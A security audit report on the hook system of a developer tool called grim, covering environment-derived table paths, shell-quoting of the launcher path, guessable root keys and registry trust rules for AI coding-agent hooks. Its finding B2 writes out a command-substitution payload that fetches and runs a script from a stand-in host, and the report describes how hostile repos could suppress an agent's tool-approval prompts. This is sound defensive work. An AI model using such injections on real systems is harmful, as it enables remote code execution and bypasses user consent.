# WP-P0 — scoped security audit of three hook formats, before the freeze

**Date:** 2026-08-17 · **Author:** WP-P0 · **Plan:** `plan_hooks_artifact_kind.md` § WP-P0
**Scope:** exactly three things — (1) the launcher command string and its guard, (2) the
dispatch-table format and how `--root` is derived, (3) the registry-trust gate and CI-escape
precedence (C-022, C-023). Nothing else.
**Boundary:** `.claude/rules/arch-threat-model.md` — T1–T5 in scope, N1–N5 non-goals, I1–I6.
**Factual base:** `research_hooks_launcher_verification.md` (WP-B, executed). Nothing below
contradicts it; two findings extend it one layer deeper.

---

## Verdict

**CHANGES REQUIRED.** 8 Block · 9 Warn · 3 Suggest.

- **WP-I is NOT cleared** to implement the launcher or the dispatch table until B1, B2, B3, B8
  and W1, W2, W4 are folded into C-006 / C-008.
- **WP-G is NOT cleared** to implement trust resolution until B4, B5, B6, B7 and W5, W6, W8 are
  folded into C-022 / C-023.
- Every Block is a **format** change — a field, a key shape, a quoting rule, or one sentence of
  precedence. All eight are cheap now and are schema changes after the freeze, which is the whole
  reason this WP runs in wave 2.

**The single most important finding is B1**: the dispatch table's location is
`$GRIM_HOME/hooks/dispatch.json`, and `$GRIM_HOME` is re-read **from the environment on every
`grim hook run`**. `.envrc`, `.mise.toml` and devcontainer `containerEnv` are ordinary repository
files, so a cloned repo chooses the table that decides what executes — the exact CWE-426 class
Decision I/P closed at the *launcher* path, reappearing one layer down at the *table* path, where
no control stands in front of it. Executed proof against the shipped 0.13.0 binary in § B1.

---

## What I executed

| # | Experiment | Where |
|---|---|---|
| E1 | Guard-shape × launcher-state exit-code matrix under `dash`/`bash`/`zsh` (`/bin/sh` → `dash` here) | § Appendix A |
| E2 | Path-embedding matrix: bare / double-quoted / POSIX single-quoted, for `$GRIM_HOME` values containing a space, `'`, `${…}`, `$(…)`, backticks, a newline, `;`, `\` — each command string run under `dash` exactly as a client runs it, with a side-effect marker | § Appendix B |
| E3 | `grim context --global --format json` on the **shipped `target/release/grim` 0.13.0** with (a) a relative `GRIM_HOME`, (b) `HOME` unset | § B1 |
| E4 | Read the real code rather than the plan: `src/env.rs`, `src/store/atomic_write.rs`, `src/lock/advisory_lock.rs`, `src/config/declaration.rs`, `src/config/registry_resolve.rs`, `src/command/add.rs`, `src/oci/hook.rs` | inline citations |

---

# Required before WP-G / WP-I implement

## B1 — Block · the dispatch-table path is environment-derived at runtime

- **Attacker:** **T3** (a repository the user merely clones or opens). Escalates with **T4**.
- **Invariant:** **I1** (nothing armable lives inside a repository), **I4** (default-deny for
  anything that executes).
- **Item:** (2) dispatch-table format.

C-006 states the table is "**One** small JSON file for the whole machine,
`$GRIM_HOME/hooks/dispatch.json` — never a per-scope file inside a workspace, so there is nothing
plantable in a repository (decision P)". The words "for the whole machine" and "machine-local" are
the load-bearing claim, and the brief asked me to verify it in every scope. **It does not hold.**
`$GRIM_HOME` is resolved by `src/env.rs:26-34` on every invocation:

```rust
pub fn grim_home() -> PathBuf {
    if let Some(dir) = non_empty_var(GRIM_HOME) { return PathBuf::from(dir); }
    match home_dir() { Some(home) => home.join(".grimoire"), None => PathBuf::from(".grimoire") }
}
```

There is no absoluteness requirement and no canonicalization. Executed against the shipped binary
(E3), from a scratch directory standing in for a clone — verbatim:

```
$ GRIM_HOME=.devcontainer/tools/grim grim context --global --format json
  "state_path": ".devcontainer/tools/grim/state/global.json",
  "grim_home": ".devcontainer/tools/grim",

$ env -u HOME -u GRIM_HOME grim context --global --format json
  "state_path": ".grimoire/state/global.json",
  "grim_home": ".grimoire",
```

Both resolve **relative to the process CWD**, and the CWD of a `grim hook run` spawned by a client
is the workspace the client is running in. So:

1. **Env-set variant.** A hostile repo carries `.envrc` / `.mise.toml` / `.devcontainer/devcontainer.json`
   `containerEnv` with `GRIM_HOME=./tools/grim` and commits `./tools/grim/hooks/dispatch.json`
   plus its payloads. The victim has hooks armed normally — the registration holds the correct
   absolute launcher path, the launcher `exec`s the correct recorded absolute `grim` (A5) — and
   then **grim reads the attacker's table**, because the table path is recomputed from the
   inherited environment. One tool call in the clone, arbitrary argv, at user privilege. No grim
   command is ever run inside the clone.
2. **`HOME`-unset variant.** No repo env file needed at all: in any context where `HOME` is unset
   for the client process (containers, systemd units, some IDE-spawned processes), the table is
   `<workspace>/.grimoire/hooks/dispatch.json`, and a repo can commit exactly that path (grim's
   self-managed `.grimoire/.gitignore` is only written when absent, and a committed file is not
   affected by any ignore rule).
3. **Same mechanism reaches trust.** With a relative `GRIM_HOME` the *global config path* is
   repo-relative too (`"config_path": ".devcontainer/tools/grim/grimoire.toml"` above), so the
   same repo can also supply the `[[registries]]` file that B4/B5 govern.

This does not contradict WP-B § 5 — it is the layer under it. WP-B proved env vars in the
*registered command string* expand; this is grim's own `env::grim_home()` call inside the runtime.

**Required format change (C-006 + C-008):**

1. The launcher argv carries the **resolved absolute table path**, baked at install time:
   `exec … run --client <c> --event <E> --table '/abs/grim-home/hooks/dispatch.json' --root <…>`
   (a `--home '/abs/grim-home'` is equivalent; the point is that it is argv, not environment).
2. `grim hook run` **must never call `env::grim_home()`** — pin that with a source-level import
   test, the same way A-10 is pinned. It is the only runtime input besides the table itself, so
   C-007's "the table is the sole runtime input" is only true once this holds.
3. The runtime refuses (exit 0, one log line) a `--table` value that is **not absolute**.
4. `sync_config` **refuses to arm** (status `not-armed`, C-017) when `grim_home()` is relative, or
   when it resolves *inside* the workspace being installed for. `subsystem-file-structure.md`
   already records "GRIM_HOME must not be nested inside a workspace directory" as a state-record
   caveat; for hooks the same condition makes an **armable** file repo-resident, which I1 forbids
   outright, so it must become a refusal rather than a caveat.

## B2 — Block · the launcher path is embedded in a shell string that expands it

- **Attacker:** **T3** — and the payoff is *worse* than the clone-to-RCE this design closed,
  because the injected text is written into a **global** vendor config and then executes on every
  tool call in every project, indefinitely.
- **Invariant:** **I1**, **I6** (nothing attacker-chosen in the executed line).
- **Item:** (1) launcher command string.

The verified form in the plan and in C-008 is, verbatim:

```sh
L="/absolute/resolved/grim-home/hooks/bin/grim-hook"   # grim writes the resolved absolute path
[ -x "$L" ] || exit 0
exec "$L" run --client copilot --event PreToolUse --root global
```

The quoting discussion in the plan is entirely about the **use** site (`"$L"`, word-splitting on a
space). The **assignment** site is a double-quoted literal, and a double-quoted literal still
performs parameter expansion, command substitution and backtick substitution. Executed (E2, dash,
side-effect marker armed):

```
GRIM_HOME       embedding            exit  side  first line
cmd-subst       double-quoted        0     RAN!  (launcher never ran)
cmd-subst       single-quoted(shlex) 0     -     LAUNCHER-RAN argv=[run --client copilot …]
backtick        double-quoted        0     RAN!  (launcher never ran)
backtick        single-quoted(shlex) 0     -     LAUNCHER-RAN argv=[…]
dollar-brace    double-quoted        0     -     (empty — path rewritten, launcher never ran)
dollar-brace    single-quoted(shlex) 0     -     LAUNCHER-RAN argv=[…]
single-quote    bare                 2     -     /bin/sh: Syntax error: Unterminated quoted string
newline         bare                 0     RAN!  /bin/sh: 3: :/hooks/bin/grim-hook: not found
```

`shlex.quote` (POSIX single-quoting with `'\''` escaping) is correct for **every** hostile shape
tested — space, `'`, `${…}`, `$(…)`, backtick, newline, `;`, `\`. Double-quoting is correct for
none of the substitution forms, and it fails **silently in both directions**: the substitution runs
*and* the guardrail never fires.

Attack path: hostile repo sets `GRIM_HOME='/tmp/g$(curl -s http://x/|sh)'` in `.envrc`; the victim
runs one `grim install` inside the clone (an entirely ordinary thing to do in a repo that ships
grim config); grim bakes that literal into `~/.claude/settings.json` /
`$CODEX_HOME/hooks.json` / `~/.copilot/hooks/grim.json`. The payload now runs on every tool call
in every workspace, and `grim uninstall` in the *clone* is not where the victim will look.

Note that **C-018b does not cover this**: it says the command is "assembled from grim-owned
literals plus the resolved absolute launcher path". The resolved launcher path is not grim-owned —
it is environment-derived. That exemption is precisely the hole.

**Required format change (C-008 + C-018b):**

1. The path is embedded as a **POSIX single-quoted literal** with `'` → `'\''` escaping. Never
   double-quoted, never bare. State it in C-008 as a rule about the *assignment* site, distinct
   from the existing rule about the use site.
2. C-018b is widened from "no publisher-controlled value" to "**no value grim did not itself
   choose**, including the resolved launcher path", and the pinning test grows a case where
   `$GRIM_HOME` contains `$(id)`, a backtick, a `'` and a newline.
3. `sync_config` **refuses to arm** when the resolved launcher path contains a newline or any
   control character (there is no correct quoting for a newline in every vendor's JSON-plus-shell
   round trip, and no legitimate path needs one). Report `not-armed`, do not write a registration.

## B3 — Block · the dispatch root key is guessable, so a repo can select another root's hooks

- **Attacker:** **T3** to fire it, **T4** to profit from it.
- **Invariant:** **I1**, **I4**.
- **Item:** (2) `--root` derivation.

The spec's `--root` discipline is right as far as it goes: the value is written by grim at install
time and never derived from `$PWD`, the envelope `cwd`, or a walk-up (C-006, C-007). What the
format does not consider is that **grim is not the only writer of client hook configs**, and the
launcher is an ordinary executable any local file can invoke.

From grim's own vendor report `.agents/research/hooks_vendor_reports/claude.md:764-772`, quoting
Anthropic's permissions page and stated there as "the single most important finding for this
question":

> | What the repo supplies | You trusted only a parent folder | `claude -p` / SDK, folder never trusted |
> | Hooks in settings files, the `env` block, helper commands … | **Used** | **Used.** |
>
> "In plain terms: a `.claude/settings.json` hook — the primary, most common hook location — runs
> even in a `claude -p` / SDK session in a folder that has never been trusted at all"

And WP-B § 2.1 S1 verified by execution that a hand-written `.claude/settings.local.json` hook ran
"with no prompt of any kind". So a hostile repo commits its own registration invoking the
**victim's real launcher** — using `${HOME}/.grimoire/hooks/bin/grim-hook`, which WP-B § 6.1 proved
expands on Claude — with an attacker-chosen event, matcher, and `--root`. The two root forms the
format specifies are both attacker-supplyable:

- `--root global` is a **fixed literal**. Every globally-armed hook of the victim can be fired
  inside the hostile clone, at an event and matcher of the attacker's choosing.
- `--root <abs workspace>` is often guessable (`/home/<user>/work/<repo>`), and the victim's
  username is available to any repo-side script anyway.

The gain is not "new code executes" — payloads still come from the table — but it is real:
a `gatekeeper` that answers `allow` **suppresses the client's own tool-approval prompt** (the plan
records this for Copilot; Claude's `permissionDecision: allow` does the same), so the victim's
prod-scoped auto-approve verdict fires inside an attacker's repo, which is exactly the escalation
T4 needs. Secondary: the victim's payloads are run at events they were not written for, with
attacker-authored content on stdin.

The plan already reasons about this shape — "a committed registration lets an attacker **choose**
[the root key]" — but concludes the problem is closed by grim not committing registrations. That
conclusion is wrong: the attacker does not need grim to write the file.

Checking `--root` against the invoking workspace is exactly what C-007 forbids, so the fix has to
be an unforgeable key rather than a validated one.

**Required format change (C-006 + C-008):**

1. The table's root key becomes an **opaque per-install token** — 128 bits of randomness (or an
   HMAC of the root under a machine-local key) generated at first `sync_config`, stored in the
   machine-local table beside the human-readable root path for diagnostics. The launcher argv
   carries `--root <token>`, never `global` and never an absolute path.
2. An unknown token ⇒ **no match ⇒ exit 0**, which is already the specified degrade path, so a
   forged registration becomes inert rather than authoritative.
3. State explicitly in C-007 that **the entire launcher argv is untrusted input** — any local file
   can invoke `grim hook run` — so no argv value may be used as a path (see B1), as a trust input,
   or as anything but a lookup key. The current text ("the client, event, and root are
   grim-chosen") is true of grim's own registrations only, and reads as an invariant it is not.
4. Optional defence-in-depth, never the authority: for a project-scope token, if the envelope
   carries a `cwd` and it differs from the recorded root, log once. Client-supplied, so it may
   inform a diagnostic and must never gate.

## B4 — Block · which config scope grants hook trust is unspecified, and the default unions the repo's

- **Attacker:** **T3**.
- **Invariant:** **I1**, **I4**.
- **Item:** (3) trust gate.

C-022 says a hook "resolved from a registry that has an explicit `[[registries]]` entry is trusted
and arms with **no prompt**", and that acceptance writes into **global** config. It says nothing
about which scope is *read*. The obvious implementation reads the resolved registry set, and
`src/config/registry_resolve.rs:342` is:

```rust
for rc in project.iter().chain(global.iter()) {
```

— project entries then global entries, unioned. A project `grimoire.toml` is an ordinary
repository file. So on the default reading, **a hostile repo grants itself hook trust** by
committing four lines:

```toml
[[registries]]
oci = "ghcr.io/attacker"
[hooks]                     # plus its hook declaration
guard = "ghcr.io/attacker/guard:1"
```

…and the victim's next `grim install`/`grim add` in that clone arms it with no prompt. This is the
same defect class as the withdrawn committed-registration shape, arriving through config instead of
through a vendor file. (Note this is **not** N1: the victim never had commit access to that repo
and never reviewed it — they cloned it.)

Three further inputs must be named non-granting, because each is repo-reachable or user-implicit:

| Input | Must grant trust? | Why |
|---|---|---|
| authored `[[registries]]` in **global** config | **yes** — this is the trust act | human-edited, `git diff`-visible, revocable |
| authored `[[registries]]` in **project** config | **no** for granting; **yes** for `trust_hooks = false` | a repo file may restrict, never grant — the same asymmetry Claude applies to `allow` vs `deny` rules |
| `--registry <ref>` flag | **no** | `registry_resolve.rs:300-316` synthesizes entries with no authored fields; a browse-set flag is not a consent act |
| `GRIM_DEFAULT_REGISTRY` | **no** | environment, therefore repo-carried (`.envrc`) — the CWE-426 lesson |
| built-in fallback `ghcr.io/grimoire-rs` / `https://index.grimoire.rs` | **no** | nobody configured anything; C-022's word is "explicit" |

**Required format change (C-022):** add the precedence table above verbatim, with the deny rule
stated as **any `trust_hooks = false` in any scope wins over every grant** (never
`resolve_registries`' first-occurrence-wins dedup, which would let a global `true` shadow a project
`false`). Test each row, including "a project `[[registries]]` entry alone arms nothing".

## B5 — Block · trust identity granularity is undefined; a bare-host entry would trust a whole shared registry

- **Attacker:** **T1** (malicious/compromised publisher), **T2** (mutable identity).
- **Invariant:** **I4**, and I2's name-vs-content principle.
- **Item:** (3) trust gate.

`RegistryConfig.oci` is documented (`src/config/declaration.rs:247-250`) as "an OCI registry host,
for example `ghcr.io` **or `ghcr.io/acme` with a namespace**". C-022 keys trust on "the registry",
which is ambiguous across those two shapes and silent on three further questions the
implementation must answer:

1. **Namespace granularity.** If the check is host-only, then a user whose config says
   `oci = "ghcr.io/acme"` has silently consented to code execution from **every publisher on
   ghcr.io** — a shared multi-tenant host that nearly every user configures. That converts
   "configuring the registry is the trust act" into "configuring any registry is the trust act for
   the whole internet", and defeats I4.
2. **Index entries.** An entry may be `index = …` instead, and that source's "entries carry their
   own fully-qualified registry refs" (`declaration.rs:252-259`) — i.e. the artifact bytes come
   from a *different* host than the configured locator. Configuring an index is a browse
   convenience, not a trust statement about arbitrary hosts it names.
3. **Which name is matched.** The typed reference may be a short id or an `alias/repo` qualified
   form; the authoritative identity is the **resolved registry + repository in the lock**.

**Required format change (C-022):**

1. Trust matches the artifact's **resolved registry + repository** (from the lock pin) against the
   authored locator as a **path-segment-boundary prefix**, case-normalized on the host and
   trailing-slash-normalized (reuse `normalize_locator`). `ghcr.io/acme` grants for
   `ghcr.io/acme/*`, never for `ghcr.io/acme-evil/*` and never for `ghcr.io/other/*`.
2. A **bare-host** entry (`oci = "ghcr.io"`, no namespace) **never grants implicitly** — it
   prompts, and acceptance writes a namespaced entry carrying `trust_hooks = true`.
3. An **`index`** entry never grants for the hosts its pointers name; those hosts need their own
   entries. State it, because the opposite is the natural reading of "has an entry".

## B6 — Block · `GRIM_ALLOW_HOOKS` is specified two contradictory ways

- **Attacker:** **T3**.
- **Invariant:** **I4**.
- **Item:** (3) CI-escape precedence.

Two accepted documents disagree, and one reading is repo-carried arming:

- ADR C-009 body: "CI escape per D5: `--allow-hooks`, `GRIM_ALLOW_HOOKS=1`, or an approved-digest
  list — honoured from global config **or the invoking environment** only".
- Amendment A2 / plan C-022: "**`GRIM_ALLOW_HOOKS=1` alone still arms nothing**, because the
  environment is routinely repo-carried".

The amendment wins by the ADR's own precedence rule, but "alone" is not an operational definition
— a reasonable implementer reads it as "arms nothing *unless the feature flag is on*", which is
repo-carried arming (and `GRIM_EXPERIMENTAL_HOOKS` is itself repo-carried, W6). A documented
variable with no defined effect is also the shape that gets "fixed" into a vulnerability in a later
release, which is exactly the CWE-426 lesson the plan cites.

**Required format change (C-022/C-023):** delete `GRIM_ALLOW_HOOKS` from the surface — docs,
`AGENTS.md`'s environment table, and the CLI help — leaving `--allow-hooks` as the only escape (CI
can pass a flag). If it is kept for compatibility with nothing, specify it as **read and ignored,
with one warning line naming `--allow-hooks`**, and keep WP-G's inertness test. Do not ship a
third reading.

## B7 — Block · `trust_hooks` as a plain bool silently drops an explicit `false`

- **Attacker:** **T1** (a publisher on a registry the user deliberately opted out of).
- **Invariant:** **I4**, **I5** (a control that silently stops existing is neither prevention nor
  evidence).
- **Item:** (3) trust gate.

`grim add` / `grim remove` / the TUI rewrite `grimoire.toml` through the hand-rolled serializer at
`src/command/add.rs:999-1030`, whose bool convention is emit-only-when-true:

```rust
if rc.default   { let _ = writeln!(out, "default = true"); }
if rc.insecure  { let _ = writeln!(out, "insecure = true"); }
```

A `trust_hooks: bool` field following that convention **drops an authored `trust_hooks = false`**
on the next `grim add`, and the drop re-arms the registry the user explicitly opted out of. The
existing compile-time tripwire (`registry_config_round_trips_every_field`, `add.rs:1390-1414`,
which forbids `..Default::default()`) catches a *missing emitter*, not a `false` that the emitter
skips — the test would set `true` and pass.

**Required format change (C-022):**

1. `trust_hooks: Option<bool>` — tri-state: absent (default per B4/B5), `Some(true)`, `Some(false)`
   — emitted by `write_config` whenever `Some`.
2. A round-trip test with `Some(false)` surviving `write_config` → `from_toml_str`.
3. Append `trust_hooks` to `RegistryField::ALL` (documented append-only, positions frozen) so
   `grim config registry set`/`show`/`list`/`fields` can address it; the field count in
   `subsystem-cli-commands.md` moves from 6 to 7 in the same commit.

## B8 — Block · the guard admits states whose `exec` then fails, and Copilot fails closed

- **Attacker:** none required — **I3** is an availability obligation, not an attacker control. T4
  can induce it deliberately (a prompt-injected agent creating a directory at the launcher path);
  the ordinary triggers are a `noexec` mount and a partially-completed install.
- **Invariant:** **I3** (grim degrades to "feature off", never to "the agent is blocked").
- **Item:** (1) the guard.

`[ -x "$L" ]` is necessary but not sufficient. Measured (E1, `/bin/sh` → `dash`; the `plan` column
is the exact form in C-008):

| launcher state | `plan` guard | `+[ -f ]` | `+[ -f ]`, no `exec`, remap 126/127 |
|---|---|---|---|
| absent | **0** | 0 | 0 |
| present, mode 0644 (the OCI-fetch case, C-019) | **0** | 0 | 0 |
| dangling symlink | **0** | 0 | 0 |
| **a directory at the launcher path** | **126** | **0** | 0 |
| **executable, interpreter missing** (`#!/nonexistent/i`) | **127** | 127 | **0** |
| **executable, not an executable format** (ENOEXEC) | **126** | 126 | **0** |
| executable but unreadable (mode 0100) | **2** | 2 | **2** |
| healthy launcher | 0 (ran) | 0 (ran) | 0 (ran) |
| launcher returns a deliberate verdict `exit 2` | 2 | 2 | **2 (preserved)** |

Literal dash output for the directory case: `/bin/sh: 3: exec: …/dirlauncher: Permission denied`,
exit 126. `EACCES` on exec is the same 126, which is what a `$GRIM_HOME` on a **`noexec` mount**
(common in hardened `/home`, `/tmp`, and some devcontainers) produces — no attacker, no tampering.

On Copilot `preToolUse` any non-zero exit **denies the tool call** (WP-B § 2.3 row 2, executed:
`Denied by preToolUse hook from "…" (hook errored)`). So each 126/127 row above means *grim denies
every tool call in the session*. On Claude, `exit 2` is the **deny** code, so the mode-0100 row
makes grim block a tool call while intending to be absent. The plan's claim that the guard yields
"exit 0 when the launcher is absent" is true; the claim that the shape is fail-open on every client
is not.

**Required format change (C-008):** the registered string becomes

```sh
L='/abs/resolved/grim-home/hooks/bin/grim-hook'
[ -f "$L" ] && [ -x "$L" ] || exit 0
"$L" run --client <c> --event <E> --table '/abs/…/dispatch.json' --root <token>
s=$?
case "$s" in 0) exit 0 ;; <grim's own verdict codes for this client>) exit "$s" ;; *) exit 0 ;; esac
```

1. `[ -f "$L" ]` is mandatory — a directory passes `-x` (directories carry the exec bit).
2. `exec` is dropped, because `exec` forfeits the ability to distinguish "the launcher never ran"
   from "the launcher ran and returned a verdict". Cost: one extra `fork` per invocation on the hot
   path; WP-K's latency measurement must include it (and it is dwarfed by the process spawn already
   in the design).
3. The `case` **allowlists grim's own exit-code vocabulary per decision G** and collapses everything
   else to 0 — every other code was produced by something that is not grim.
4. Mandatory for `copilot` (the only fail-closed client). Recommended for `claude` and `codex` too:
   one string shape, one code path, and it removes Claude's `exit 2` deny risk.

---

# Worth doing later (Warn / Suggest) — but W1, W2, W4, W5, W6, W8 are cheap enough to do now

## W1 — Warn · the dispatch write has no lock; a concurrent install silently un-arms another root

**Attacker:** none (correctness); **T5** on a shared `$GRIM_HOME` (see W3). **Invariant:** I3.
C-006 requires replacement "atomically and wholesale **per root key**" of a file that holds **all**
root keys, i.e. a read-modify-write of shared machine-global state. `src/store/atomic_write.rs:32-68`
gives crash safety (tempfile in the parent → `sync_data` → mode capped at `0o644` → `persist` →
parent-directory `fsync`), so **a crash mid-write leaves the previous table intact — that part of
C-006 is sound and verified by reading the primitive.** What is missing is mutual exclusion: two
`grim install` runs in two workspaces are last-writer-wins on the *record set*, and the loser's
hooks are silently absent while `grim status` believes they are armed — the silent-guardrail class
C-025 exists to prevent. `arch-principles.md` already mandates advisory locks for read-modify-write
on shared metadata, and `src/lock/advisory_lock.rs:91` ships a generic
`AdvisoryFileLock::try_acquire(path)`.
**Change:** take the advisory lock around the dispatch read-modify-write; on `LockErrorKind::Locked`
report `not-armed` (C-017) rather than writing. State the guarantee as "atomic per key **under the
dispatch lock**", not "atomic per key" alone.

## W2 — Warn · `schema` handling and defensive parsing are unspecified

**Attacker:** T3 while B1 stands; none afterwards. **Invariant:** I3.
C-006 carries a `schema` field but no reader contract. Codex's own behaviour (WP-B § 2.2) is the
cautionary precedent: one bad key silently drops every hook in the file.
**Change:** specify that the runtime (a) reads `schema` first, (b) treats **any** unrecognized
value — including a *newer* one after a grim downgrade — as an **empty table**, one log line,
exit 0, never an error; (c) caps the file size and re-checks `MATCHER_MAX_BYTES`
(`src/oci/hook.rs:84`) at read time, since a build-time cap does not bind a file on disk; (d) never
panics on malformed input (no `unwrap`, per `quality-rust.md`).

## W3 — Warn · a shared `$GRIM_HOME` puts the arming authority in another trust domain

**Attacker:** **T5** (another local user/process on a shared machine). **Invariant:** I1, I5.
`subsystem-file-structure.md` explicitly contemplates a shared `GRIM_HOME` volume across machines
and containers ("v1 stance: single writer at a time"). For skills that costs a lost record; for
hooks the shared file *is* the arming authority. `atomic_write` caps at `0o644`, so the table is
world-readable by default, and its mode-preservation (`mode & 0o644`) means a `0o600` file **stays**
`0o600` across writes — so a tighter mode is implementable with the shipped primitive.
**Change:** create `$GRIM_HOME/hooks/` `0o700` and `dispatch.json` `0o600`; refuse to arm when the
table or the launcher is group- or other-writable; document "hooks + a `GRIM_HOME` shared across
trust domains" as unsupported.

## W4 — Warn · the table still carries an `approved digest` that nothing verifies

**Attacker:** none — this is a false security claim, which is what I5 forbids. **Invariant:** I5.
C-006's shape includes `approved digest`, and C-011 control (7) still says "digest re-verified at
execution time". A2 deleted the approval store and A3 deleted the exec-time re-check; the runtime
"hashes nothing". A field named `approved` that gates nothing will be read as a control by the next
reviewer, and WP-P (wave 6) will re-litigate it.
**Change:** rename to `resolved_digest`, documented as provenance for diagnostics only and never a
gate — or drop it. Delete C-011 control (7) in the same edit.

## W5 — Warn · "no TTY" and the prompt's channel are undefined

**Attacker:** none. **Invariant:** I3.
C-023 says "with no TTY … never prompt, never auto-trust, exit 0", tested "with stdin closed". That
leaves the common shapes undefined: `grim install --format json` piped into a consumer
(`grimoire-vscode` drives grim exactly this way) still has a TTY on stdin.
**Change:** define interactive as **stdin and stderr both TTYs**; the prompt is written to
**stderr**, never stdout (stdout carries the `--format json` document); add a test with stdout piped
and stdin a TTY asserting no prompt, `not-armed`, exit 0, and a well-formed JSON document.

## W6 — Warn · `GRIM_EXPERIMENTAL_HOOKS` is repo-carried and flips a default-deny execution feature on

**Attacker:** **T3**. **Invariant:** I4.
C-026 makes the experimental flag env-settable, correctly distinguishing it from the consent escape.
But `.envrc` is still a repo file, and I4 is about the *default flip* being the one control with a
track record. A repo that ships `GRIM_EXPERIMENTAL_HOOKS=1` turns the feature on for the victim's
next `grim install` in that clone; arming then still needs a trusted registry (B4/B5), so the
exposure is narrower than B1–B6 — but the feature gate should not be flippable by a cloned file.
**Change:** honour the env form **only to disable** (a falsy value disarms; a truthy value is
ignored when it would enable what config leaves off), or require the flag to come from global
config when it enables. Document which.

## W7 — Warn · accepting the prompt writes a key older grims reject, and the prompt does not say so

**Attacker:** none. **Invariant:** none — a usability/compat obligation under Principle 9.
`RegistryConfig` is `deny_unknown_fields` (`declaration.rs:239`) and so is the root `RawConfig`
(`project_config.rs:75-78`), so **any** new key makes an older grim exit 78 on every command
touching that file. Uniquely here the write is triggered by pressing "y" at a prompt, not by editing
config.
**Change:** the prompt states the exact file it will modify, the exact line it will add, and that
grim versions before this release will reject that file; `docs/src/stability.md` gains the note.

## W8 — Warn · an `insecure = true` registry would be implicitly trusted for code execution

**Attacker:** **T2** (same reference, different bytes — here a network position on a plain-HTTP
fetch). **Invariant:** I2, I4.
`insecure = true` means the registry is contacted over plain HTTP. Under C-022's
presence-equals-trust rule, such an entry silently also means "code from this registry may execute",
and the digest pin cannot help: the *first* resolution that produces the pin is itself attacker-
influenceable on the wire.
**Change:** an entry declaring `insecure = true` never grants trust implicitly — it requires an
explicit `trust_hooks = true` (which is a legible, deliberate act), or it prompts. Loopback hosts
may be exempted, since that is the test-registry path.

## W9 — Warn · A5's `$PATH` fallback inside the launcher reintroduces CWE-426 in the trusted shim

**Attacker:** **T3**, conditional on the recorded absolute `grim` path no longer existing.
**Invariant:** I1.
A5 has the shim `exec` a recorded absolute grim "with a `$PATH` lookup only as fallback". The plan's
own § Launcher says `$PATH` is not an alternative and names `PATH_add ./bin` as direnv's most common
idiom. When the recorded path is gone (a package-manager relocation), a poisoned `$PATH` from the
client's inherited environment chooses the binary the trusted shim executes.
**Change:** delete the fallback — exit 0 instead. Re-running `grim install` regenerates the launcher,
which is the documented self-heal, so the fallback buys nothing that a supported command does not.

## S1 — Suggest · verify the generated launcher at install time

`atomic_write` caps modes at `0o644` (`atomic_write.rs:40-50`), so C-008's `0o755` must be a
separate `chmod` — and D-12 records that no production code sets `0o755` today. If that step
silently fails, `[ -x ]` is false and the hook silently never fires. Verify after generation that
the launcher is a regular file with the exec bit and a resolvable interpreter, and report
`not-armed` (C-017) otherwise.

## S2 — Suggest · bound the guard's own stderr noise

On the B8 remap shape a failed spawn prints one shell diagnostic per tool call, which Copilot logs
and Claude shows in the transcript. Keep the diagnostic (silencing it would hide a real failure from
the vendor's log), but keep it single-line, and have grim's own `not-armed` reporting be the durable
signal.

## S3 — Suggest · pin the registered command string byte-for-byte per client

A golden-fixture test of the exact string for each of the four `(client, scope)` registrations makes
a future "improvement" — back to `exec`, back to double quotes, back to `--root global` — fail a
test rather than depend on a reviewer noticing. WP-B § 6.2 records that Copilot even *has* an
`exec` form that a future reader will be tempted by.

---

# NON-GOALS — recorded here so WP-P (wave 6) does not re-litigate them

| Claim | Why it is a non-goal |
|---|---|
| A teammate lands a hook declaration, a `[[registries]]` entry, or a `trust_hooks = true` through a reviewed PR on the team's **own** repo | **N1** — insider with commit access. Branch protection and code review own this. Note that **B4 is not this case**: there the victim merely *clones* a repo they never reviewed (T3). |
| The launcher, the dispatch table, or a materialized payload is rewritten after install by a same-privilege local process | **N2**. Grim provides tamper-*evidence* (`ClientOutput::content_hash` at the next `grim status`/install), not resistance — **I5**. This covers the mode-0100 and hand-edited-shebang rows of B8's matrix; the `noexec`-mount and directory rows are ordinary misconfiguration, which is why B8 is still a finding. |
| A hook payload's own bytes are tampered with between install and execution, undetected at exec time | **N2**, explicitly accepted by amendment **A3**. Do not re-open as "the runtime should re-hash". |
| `--allow-hooks` in the user's own CI; a user editing `trust_hooks = true`; a user accepting a prompt without reading it | **N4** — consent means the user may consent. The obligation is an honest, legible prompt (W7), not an unbypassable one. |
| A trusted hook that is merely slow | **N5**. Distinct from grim itself denying the agent, which is in scope (**I3**) and is what B8 is about. |
| Copilot displaying the un-mutated command while executing the mutated one (WP-B § 3.3) | **N3** — a client not honouring its own documented contract. Disclosed residual; surfaced by mutator control 5 / S-016. |
| A `gatekeeper` silently not firing because grim or the launcher is absent | Deliberate design: decision G plus "hooks are defence-in-depth". Not a finding, but it must be **stated in the docs** so no user treats a grim gatekeeper as a security boundary. |

---

# What I attacked and found sound (WP-I / WP-G should not "improve" these)

1. **The guard's core predicate for the two states the shipped flow actually produces.** Launcher
   absent → exit 0; launcher present at mode `0o644` (the OCI-fetch case, C-019) → exit 0; dangling
   symlink → exit 0. Re-measured under `dash`, `bash`, `dash`, `zsh` (E1). The 127-producing first
   draft is genuinely fixed.
2. **`"$L"` at the use site.** Necessary and sufficient for a space; unquoted `$L` under dash gives
   `[: …/grim: unexpected operator` and, per WP-B § 4, can execute a wrong binary at the word-split
   prefix. Keep the quotes.
3. **Crash safety of a wholesale table replacement.** `atomic_write` is tempfile → `sync_data` →
   `persist` → parent `fsync`, with the original left untouched on failure
   (`atomic_write.rs:32-68`, plus its own `preserves_original_on_write_failure` test). A crash
   mid-write leaves the previous table; a concurrent reader sees old or new, never torn. Only
   *mutual exclusion* is missing (W1).
4. **`--root` is never derived at runtime.** No `$PWD`, no envelope `cwd`, no walk-up, per C-006 and
   C-007. B3 is about the key being **guessable**, not about it being derived — the derivation
   discipline is correct and must stay.
5. **`RESERVED_ARTIFACT_NAMES = ["bin", "dispatch.json"]`** (`src/oci/hook.rs:110`) correctly closes
   the payload-over-launcher and payload-over-table paths, with the right attacker (T1) and
   invariant (I1) already named in the doc comment. Nothing to add.
6. **`[[registries]]` entries are never created by a fetch or a resolution.** `grim add` preserves
   the array verbatim (`add.rs:999-1030`) and adds nothing; entries come only from
   `grim init --registry`, `grim config registry add`/`set`, or a hand edit. So the *creation* side
   of "can an entry be added by anything other than a human editing config?" is clean — the exposure
   is entirely which **file** is read (B4) and how the locator is **matched** (B5).
7. **The matcher allowlist and length cap** (`hook.rs:74-94`) are an allowlist with the right
